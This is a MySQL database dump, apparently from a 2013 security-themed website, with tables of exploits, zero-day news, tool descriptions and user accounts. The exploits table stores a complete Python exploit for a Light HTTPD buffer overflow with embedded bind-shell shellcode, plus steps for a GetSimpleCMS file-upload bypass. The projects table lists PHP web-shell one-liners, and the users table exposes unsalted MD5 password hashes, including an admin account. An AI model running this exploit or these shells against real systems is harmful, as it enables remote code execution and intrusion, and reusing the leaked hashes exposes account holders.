-- MySQL dump 10.13  Distrib 5.5.32, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: scope
-- ------------------------------------------------------
-- Server version	5.5.32-0ubuntu0.12.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `exploits`
--

DROP TABLE IF EXISTS `exploits`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `exploits` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `author` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  `description` text NOT NULL,
  `platform` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `exploits`
--

LOCK TABLES `exploits` WRITE;
/*!40000 ALTER TABLE `exploits` DISABLE KEYS */;
INSERT INTO `exploits` VALUES (1,'Jacob Holcomb1','Windows Light HTTPD 0.1 - Buffer Overflow','import urllib2\r\nfrom time import sleep\r\n \r\n#########################################################################################################################################\r\n# Title************************Windows Light HTTPD v0.1 HTTP GET Buffer Overflow\r\n# Discovered and Reported******24th of April, 2013\r\n# Discovered/Exploited By******Jacob Holcomb/Gimppy042\r\n# Software Vendor**************http://sourceforge.net/projects/lhttpd/?source=navbar\r\n# Exploit/Advisory*************http://infosec42.blogspot.com/\r\n# Software*********************Light HTTPD v0.1\r\n# Tested Platform**************Windows XP Professional SP2\r\n# Date*************************24/04/2013\r\n#\r\n#PS - This is a good piece of software to practice Stack Based Buffer Overflows if you curiouz and want to learnz\r\n#########################################################################################################################################\r\n# Exploit-DB Note: Offset 255 for Windows XP SP3\r\n# jmp esp ntdll 0x7c31fcd8\r\n# payload = &quot;\\x90&quot; * 255 + &quot;\\xd8\\xfc\\x91\\x7c&quot; + &quot;\\x90&quot; * 32 + shellcode\r\n \r\ndef targURL():\r\n \r\n    while True:\r\n     \r\n        URL = raw_input(&quot;\\n[*] Please enter the URL of the Light HTTP server you would like to PWN. Ex. http://192.168.1.1\\n\\n&gt;&quot;)\r\n        if len(URL) != 0 and URL[0:7] == &quot;http://&quot;:\r\n            break\r\n             \r\n        else:\r\n            print &quot;\\n\\n[!!!] Target URL cant be null and must contain http:// or https:// [!!!]\\n&quot;\r\n            sleep(1)\r\n             \r\n    return str(URL)\r\n     \r\ndef main():\r\n \r\n    target = targURL()\r\n    # msfpayload windows/shell_bind_tcp EXITFUNC=thread LPORT=1337 R | msfencode -c 1 -e x86/shikata_ga_nai -b &quot;\\x00\\x0a\\x0d\\xff\\x20&quot; R\r\n    shellcode = &quot;\\xb8\\x3b\\xaf\\xc1\\x8a\\xdb\\xcd\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9&quot;\r\n    shellcode += &quot;\\xb1\\x56\\x83\\xc2\\x04\\x31\\x42\\x0f\\x03\\x42\\x34\\x4d\\x34\\x76&quot;\r\n    shellcode += &quot;\\xa2\\x18\\xb7\\x87\\x32\\x7b\\x31\\x62\\x03\\xa9\\x25\\xe6\\x31\\x7d&quot;\r\n    shellcode += &quot;\\x2d\\xaa\\xb9\\xf6\\x63\\x5f\\x4a\\x7a\\xac\\x50\\xfb\\x31\\x8a\\x5f&quot;\r\n    shellcode += &quot;\\xfc\\xf7\\x12\\x33\\x3e\\x99\\xee\\x4e\\x12\\x79\\xce\\x80\\x67\\x78&quot;\r\n    shellcode += &quot;\\x17\\xfc\\x87\\x28\\xc0\\x8a\\x35\\xdd\\x65\\xce\\x85\\xdc\\xa9\\x44&quot;\r\n    shellcode += &quot;\\xb5\\xa6\\xcc\\x9b\\x41\\x1d\\xce\\xcb\\xf9\\x2a\\x98\\xf3\\x72\\x74&quot;\r\n    shellcode += &quot;\\x39\\x05\\x57\\x66\\x05\\x4c\\xdc\\x5d\\xfd\\x4f\\x34\\xac\\xfe\\x61&quot;\r\n    shellcode += &quot;\\x78\\x63\\xc1\\x4d\\x75\\x7d\\x05\\x69\\x65\\x08\\x7d\\x89\\x18\\x0b&quot;\r\n    shellcode += &quot;\\x46\\xf3\\xc6\\x9e\\x5b\\x53\\x8d\\x39\\xb8\\x65\\x42\\xdf\\x4b\\x69&quot;\r\n    shellcode += &quot;\\x2f\\xab\\x14\\x6e\\xae\\x78\\x2f\\x8a\\x3b\\x7f\\xe0\\x1a\\x7f\\xa4&quot;\r\n    shellcode += &quot;\\x24\\x46\\x24\\xc5\\x7d\\x22\\x8b\\xfa\\x9e\\x8a\\x74\\x5f\\xd4\\x39&quot;\r\n    shellcode += &quot;\\x61\\xd9\\xb7\\x55\\x46\\xd4\\x47\\xa6\\xc0\\x6f\\x3b\\x94\\x4f\\xc4&quot;\r\n    shellcode += &quot;\\xd3\\x94\\x18\\xc2\\x24\\xda\\x33\\xb2\\xbb\\x25\\xbb\\xc3\\x92\\xe1&quot;\r\n    shellcode += &quot;\\xef\\x93\\x8c\\xc0\\x8f\\x7f\\x4d\\xec\\x5a\\x2f\\x1d\\x42\\x34\\x90&quot;\r\n    shellcode += &quot;\\xcd\\x22\\xe4\\x78\\x04\\xad\\xdb\\x99\\x27\\x67\\x6a\\x9e\\xe9\\x53&quot;\r\n    shellcode += &quot;\\x3f\\x49\\x08\\x64\\xba\\xb0\\x85\\x82\\xae\\xd2\\xc3\\x1d\\x46\\x11&quot;\r\n    shellcode += &quot;\\x30\\x96\\xf1\\x6a\\x12\\x8a\\xaa\\xfc\\x2a\\xc4\\x6c\\x02\\xab\\xc2&quot;\r\n    shellcode += &quot;\\xdf\\xaf\\x03\\x85\\xab\\xa3\\x97\\xb4\\xac\\xe9\\xbf\\xbf\\x95\\x7a&quot;\r\n    shellcode += &quot;\\x35\\xae\\x54\\x1a\\x4a\\xfb\\x0e\\xbf\\xd9\\x60\\xce\\xb6\\xc1\\x3e&quot;\r\n    shellcode += &quot;\\x99\\x9f\\x34\\x37\\x4f\\x32\\x6e\\xe1\\x6d\\xcf\\xf6\\xca\\x35\\x14&quot;\r\n    shellcode += &quot;\\xcb\\xd5\\xb4\\xd9\\x77\\xf2\\xa6\\x27\\x77\\xbe\\x92\\xf7\\x2e\\x68&quot;\r\n    shellcode += &quot;\\x4c\\xbe\\x98\\xda\\x26\\x68\\x76\\xb5\\xae\\xed\\xb4\\x06\\xa8\\xf1&quot;\r\n    shellcode += &quot;\\x90\\xf0\\x54\\x43\\x4d\\x45\\x6b\\x6c\\x19\\x41\\x14\\x90\\xb9\\xae&quot;\r\n    shellcode += &quot;\\xcf\\x10\\xd9\\x4c\\xc5\\x6c\\x72\\xc9\\x8c\\xcc\\x1f\\xea\\x7b\\x12&quot;\r\n    shellcode += &quot;\\x26\\x69\\x89\\xeb\\xdd\\x71\\xf8\\xee\\x9a\\x35\\x11\\x83\\xb3\\xd3&quot;\r\n    shellcode += &quot;\\x15\\x30\\xb3\\xf1&quot;\r\n     \r\n    #7C941EED   FFE4             JMP ESP ntdll.dll\r\n    payload = &quot;\\x90&quot; * 258 + &quot;\\xED\\x1E\\x94\\x7C&quot; + &quot;\\x90&quot; * 32 + shellcode\r\n    port = &quot;:3000/&quot;\r\n    sploit = target + port + payload\r\n    try:\r\n        print &quot;\\n[*] Preparing to send Evil PAYLoAd to %s!\\n[*] Payload Length: %d\\n[*] Waiting...&quot; % (target[7:], len(sploit))\r\n        httpRequest = urllib2.Request(sploit)\r\n        sploit = urllib2.urlopen(httpRequest, None, 6)\r\n    except(urllib2.URLError):\r\n        print &quot;\\n[!!!] Error. Please check that the Light HTTP Server is online [!!!]\\n&quot;\r\n    except:\r\n        print &quot;\\n[!!!] The server did not respond, but the payload was sent. F!ng3r$ Cr0$$3d 4 c0d3 Ex3cut!0n! [!!!]\\n&quot;\r\n         \r\n     \r\n     \r\nif __name__ == &quot;__main__&quot;:\r\n    main() \r\n','Windows'),(2,'Ahmed Elhady Mohamed','GetSimpleCMS Version 3.2.1 Arbitrary File Upload Vulnerability','GetSimpleCMS Version 3.2.1 Arbitrary File Upload Vulnerability\r\n===================================================================================\r\n# Exploit Title: GetSimpleCMS Version 3.2.1 Arbitrary File Upload Vulnerability\r\n# Download link: http://code.google.com/p/get-simple-cms/\r\n# version: 3.2.1\r\n# Category: webapps\r\n# Tested on: ubuntu 13.4\r\n# Author: Ahmed Elhady Mohamed\r\n# Email: ahmed.elhady.mohamed@gmail.com\r\n# Website: www.itsec4all.com\r\n===================================================================================\r\nDescription:\r\n- GetSimpleCMS Version 3.2.1 suffers from arbitrary file upload vulnerability which allows an attacker to upload a HTML page.\r\n    - The main reason of this vulnerability is that the application uses a blacklist technique to compare the file aganist mime types and extensions.\r\n    - If the mime type or the extension is in the blacklist array , the application won\'t upload it.\r\n     \r\nExploit:\r\n    - For exploiting this vulnerability we will create a file with mutiple extensions for example \"exploit.html.fr\"\r\n    - The application will check the mime type and extension of the file which is \"fr\" aganist the blacklist array mime type and extensions.\r\n    - and ofcourse \"fr\" extension won\'t be in the blacklist array so the application will upload it successfully.\r\n    - The uploaded file will be under the \"data/uploads/\" folder.\r\n     \r\nSolution:\r\n    - The application should use whitelisting technique which compare the file extensions and mime types aganist\r\n    - acceptable mime types and extensions for more information google for \"whitelisting vs blacklisting\"','PHP');
/*!40000 ALTER TABLE `exploits` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `guestbook`
--

DROP TABLE IF EXISTS `guestbook`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `guestbook` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` text NOT NULL,
  `approved` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `guestbook`
--

LOCK TABLES `guestbook` WRITE;
/*!40000 ALTER TABLE `guestbook` DISABLE KEYS */;
/*!40000 ALTER TABLE `guestbook` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `news`
--

DROP TABLE IF EXISTS `news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `news` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(200) NOT NULL,
  `description` text NOT NULL,
  `url` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `news`
--

LOCK TABLES `news` WRITE;
/*!40000 ALTER TABLE `news` DISABLE KEYS */;
INSERT INTO `news` VALUES (1,'Windows 8 0day','French security company Vupen tweeted on Oct. 30, 2012 that they had discovered a security flaw in Windows 8 and that they were selling it to the highest bidder.\nOur first 0day for Win8+IE10 with HiASLR/AntiROP/DEP & Prot Mode sandbox bypass is ready for customers.','http://www.worldcrunch.com/tech-science/hackers-black-market-selling-system-flaws-and-fixes-to-the-highest-bidder/hackers-security-vupen-google-zero-day-exploit/c4s11028/'),(2,'Java 0day','A new Java 0-day vulnerability is being exploited in the wild. If you use Java, you can either uninstall/disable the plugin to protect your computer or set your security settings to \"High\" and attempt to avoid executing malicious applets. This flaw was first discovered by FireEye','http://thenextweb.com/insider/2013/03/01/new-java-vulnerability-is-being-exploited-in-the-wild-disable-the-plugin-or-change-your-security-settings/'),(3,'Flash Player 0day','Adobe issued a security bulletin warning of zero-day attacks that leverage two Flash vulnerabilities. One is related to ActionScript regular expression handling. (Some sources refer to this vulnerability as CVE-2013-0633. We are waiting for Adobe to confirm the proper CVE ID.)','http://blogs.mcafee.com/mcafee-labs/adobe-flash-zero-day-attack-uses-advanced-exploitation-technique');
/*!40000 ALTER TABLE `news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `projects`
--

DROP TABLE IF EXISTS `projects`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `projects` (
  `id` int(11) NOT NULL,
  `name` varchar(200) DEFAULT NULL,
  `description` text,
  `url` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `projects`
--

LOCK TABLES `projects` WRITE;
/*!40000 ALTER TABLE `projects` DISABLE KEYS */;
INSERT INTO `projects` VALUES (1,'WebHandler','WebHandler tries to simulate a \'Linux bash prompt\' to handle and process:\r\n\r\n- PHP program execution functions _(e.g. `system`, `passthru`, `exec`, etc)_\r\n- Bind shell connections\r\n- Reserve shell connections\r\nAnother feature is to spoof the \"User-Agent\" field in the HTTP header. (--random-angent).\r\n\r\nIt also supports HTTP proxies (--proxy http://<ip>:<port>)\r\n\r\nWebHandler works for POST and GET requests:\r\n\r\n<?php system($_GET[\'cmd\']); ?>\r\n<?php passthru($_REQUEST[\'cmd\']); ?>\r\n<?php echo exec($_POST[\'cmd\']); ?>\r\n\r\nWebHandler is a replacement for netcat connections.\r\n\r\n','https://github.com/lnxg33k/webhandler'),(2,'iCrackHash','iCrackHash is a search engine for hashes and passwords. First it detects the hash type in a simple way then it deals with the hash as the following.\r\nFor two way hashes \'base64, ascii, asciihex and etc...\' it uses some builtin methods in python to decrypt them \'e.g.) .encode()\'.\r\nFor one way hashes \'Md5, Sha-1, sha-224 and etc...\' it uses some online DBs to search for the hash \"e.g.) goog, tobtu, rednoize and etc...\".\r\nif iCrackHash couldn\'t figure out the hash type it will consider it a normal string and it will encode this string in different formats like \'hex, hexentity, fullurl and etc...\'.','https://github.com/lnxg33k/iCrackHash'),(3,'PeekIT','PeekIT\r\n========\r\n\r\n	PeekIT is (*nix software) a Command Line Packet sniffer. it uses Packet capturing library \"libpcap\"\r\n\r\nHow is it built:\r\n=================\r\n	PeekIT uses the header (glocal structures) to applicate several casts and to control global variable\r\n	it starts by collecting local machine\'s and network\'s information\r\n	local_info.c contains several functions for obtaining the local machine\'s info\r\n	packet_cap.c contains a packet grabbing and casting functionalities. also it might be used for screening the incoming and outgoing packets and limiting them to gateway if you dont wish to receive packets from any host on your network. it warns you with a illegal connection in case you recieved one.\r\n	\r\nTo be supported\r\n================\r\n	PeekIT does not yet support IPv6 and doesn\'t have a functional screening modes yet.\r\n\r\nNotes\r\n======\r\n	You should compile this code with a -lpcap\r\n	This Software is CATReloaded project\r\n	http://catreloaded.net','https://github.com/SaadTalaat/PeekIT');
/*!40000 ALTER TABLE `projects` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `username` varchar(30) NOT NULL,
  `password` varchar(250) NOT NULL,
  `role` tinyint(4) NOT NULL,
  `email` varchar(30) NOT NULL,
  `is_active` tinyint(1) NOT NULL DEFAULT '0',
  `confirmation_code` varchar(32) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'','admin','e10adc3949ba59abbe56e057f20f883e',1,'admin@localhost',1,''),(14,'Ahmed Shawky','lnxg33k','b5f2d7f00b4a49e833711dc3dc6d8c8c',0,'ahmed@localhost',0,'bc8b11262f1f051b498707b8b7165411');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2013-10-05 21:51:14
